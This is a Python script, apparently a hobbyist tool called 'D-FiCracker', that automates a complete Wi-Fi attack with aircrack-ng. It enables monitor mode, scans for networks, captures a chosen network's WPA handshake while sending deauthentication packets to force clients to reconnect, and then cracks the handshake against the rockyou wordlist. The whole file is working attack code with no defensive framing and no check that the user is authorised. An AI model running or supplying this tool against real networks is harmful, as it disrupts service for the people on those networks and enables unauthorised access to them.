#!/usr/bin/env python3

import subprocess
import re
import os
import time
from threading import Thread

def list_wireless_interfaces():
    result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    interfaces = re.findall(r'^(\w+)\s+IEEE 802.11', result.stdout, re.MULTILINE)
    return interfaces

def choose_interface(interfaces):
    print("\nAvailable Wireless Interfaces:")
    for idx, iface in enumerate(interfaces):
        print(f"[{idx}] {iface}")
    choice = int(input("\nSelect the interface number: "))
    return interfaces[choice]

def scan_networks(interface):
    print("\nScanning for Wi-Fi networks. Press Ctrl+C to stop when list appears.\n")
    try:
        subprocess.run(['airodump-ng', interface])
    except KeyboardInterrupt:
        print("\nScan stopped. Please note the target BSSID and Channel.\n")

def capture_handshake(monitor_iface, bssid, channel):
    output_file = f"handshakes/{bssid.replace(':', '-')}"
    os.makedirs("handshakes", exist_ok=True)

    print(f"\n📡 Capturing handshake on {bssid} (Channel {channel})...")

    airodump_cmd = [
        'airodump-ng',
        '-c', channel,
        '--bssid', bssid,
        '-w', output_file,
        monitor_iface
    ]
    airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(5)

    def deauth_attack():
        print("💥 Sending deauth packets...")
        deauth_cmd = [
            'aireplay-ng',
            '--deauth', '10',
            '-a', bssid,
            monitor_iface
        ]
        subprocess.run(deauth_cmd)

    Thread(target=deauth_attack).start()

    try:
        print("⏳ Waiting for handshake... Press Ctrl+C to stop after ~20 sec.")
        time.sleep(20)
    except KeyboardInterrupt:
        print("\n🛑 Capture interrupted.")

    airodump_proc.terminate()
    print(f"📁 Handshake saved as: {output_file}-01.cap")
    return f"{output_file}-01.cap"

def crack_handshake(handshake_file):
    print("\n🔐 Cracking the handshake...")

    wordlist = input("Enter wordlist path [default: /usr/share/wordlists/rockyou.txt]: ").strip()
    if not wordlist:
        wordlist = "/usr/share/wordlists/rockyou.txt"

    if not os.path.isfile(wordlist):
        print(f"❌ Wordlist not found at {wordlist}")
        return

    crack_cmd = ['aircrack-ng', '-w', wordlist, handshake_file]
    subprocess.run(crack_cmd)

def main():
    print("📶 Welcome to D-FiCracker by Dilshuppa\n")

    interfaces = list_wireless_interfaces()
    if not interfaces:
        print("❌ No wireless interfaces found.")
        return

    interface = choose_interface(interfaces)
    print(f"\n✅ Selected: {interface}")

    print(f"\n⏳ Enabling monitor mode...")
    subprocess.run(['airmon-ng', 'start', interface])

    monitor_iface = interface + "mon"
    scan_networks(monitor_iface)

    bssid = input("Enter target BSSID: ").strip()
    channel = input("Enter target Channel: ").strip()

    handshake_file = capture_handshake(monitor_iface, bssid, channel)

    crack_handshake(handshake_file)

if __name__ == "__main__":
    main()
